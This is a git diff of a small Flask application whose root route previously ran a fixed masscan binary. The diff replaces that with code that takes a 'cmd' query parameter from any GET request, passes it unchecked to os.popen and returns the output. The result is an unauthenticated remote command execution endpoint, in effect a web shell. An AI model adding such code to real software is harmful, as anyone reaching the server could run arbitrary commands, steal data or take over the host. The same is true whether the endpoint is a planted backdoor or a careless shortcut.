@@ -1,4 +1,4 @@
-from flask import Flask
+from flask import Flask,render_template,request
 import os
 
 def create_app():
@@ -7,13 +7,17 @@ def create_app():
 
 app = create_app()
 
-@app.route('/')
+@app.route("/",methods = ['GET', 'POST'])
 def index():
-    line = ''
-    for lines in os.popen('./masscan').readlines():
-        line = line + lines + "\n"
+    if request.method == "GET":
+        cmd = request.args.get('cmd')
+        line = ''
+        for lines in os.popen(str(cmd)).readlines():
+            line = line + lines + "\n"
 
-    return  line
+        return  line
+    else:
+        return ''
 
 if __name__ == '__main__':
     app.run()
